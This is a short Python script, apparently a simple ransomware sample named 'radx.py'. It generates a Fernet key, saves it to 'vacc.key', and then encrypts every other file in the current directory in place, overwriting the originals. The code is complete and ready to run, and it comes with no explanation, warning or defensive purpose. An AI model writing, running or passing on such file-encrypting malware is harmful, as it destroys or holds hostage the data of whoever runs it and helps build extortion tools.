#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

# List for files on the os
files = []

for file in os.listdir():
    if file == "radx.py" or file == "vacc.key":
        continue
    if os.path.isfile(file):
        files.append(file)

dev_vac = Fernet.generate_key()

with open("vacc.key", "wb") as f:
    f.write(dev_vac)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_inf = Fernet(dev_vac).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_inf)